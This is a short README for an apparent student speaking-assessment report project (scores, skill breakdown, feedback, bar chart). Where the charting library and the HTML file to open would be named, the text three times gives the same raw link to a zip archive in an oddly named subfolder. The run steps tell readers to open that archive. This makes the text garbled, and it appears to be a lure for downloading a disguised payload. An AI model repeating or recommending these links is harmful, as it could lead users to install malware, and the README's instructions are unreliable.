# Student Speaking Assessment Report

This project is a simple speaking assessment report built for assignment purposes using HTML, CSS, JavaScript, JSON, and https://github.com/rahuldounde21/student-report-assignment/raw/refs/heads/main/crystallic/student-report-assignment-potterer.zip It displays student scores, skill-wise performance, autogenerated feedback, and a bar graph visualization.

---

## 📊 Features
- Overall score out of 9
- Individual skill scores:
  - Pronunciation
  - Fluency
  - Vocabulary
  - Grammar
- Automatic feedback based on score logic
- Bar chart visualization using https://github.com/rahuldounde21/student-report-assignment/raw/refs/heads/main/crystallic/student-report-assignment-potterer.zip
- JSON used as a data source (no backend or database needed)

---

## ▶️ How to Run
1. Download or clone this repository.
2. Open `https://github.com/rahuldounde21/student-report-assignment/raw/refs/heads/main/crystallic/student-report-assignment-potterer.zip` in any browser.
3. (Recommended) Use **Live Server** in VS Code for JSON fetch to work properly.
